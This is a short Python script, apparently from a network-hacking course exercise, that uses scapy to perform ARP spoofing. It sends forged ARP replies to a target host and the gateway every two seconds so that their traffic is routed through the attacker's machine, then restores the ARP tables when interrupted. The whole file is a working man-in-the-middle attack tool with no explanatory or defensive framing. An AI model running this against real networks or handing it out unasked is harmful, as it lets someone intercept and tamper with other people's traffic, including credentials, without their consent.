#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    print(answered_list[0][1].hwsrc)
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst= destination_mac, psrc=source_ip, hwsrc = source_mac)
    scapy.send(packet, count=4, verbose=False)

gateway_ip = "172.20.10.2"
target_ip = "172.20.10.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\rPackets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nCTRL + C Detected .... Resetting ARP tables.... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
except IndexError:
	print("\nError Detected .... Resetting ARP tables.... Please wait.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)


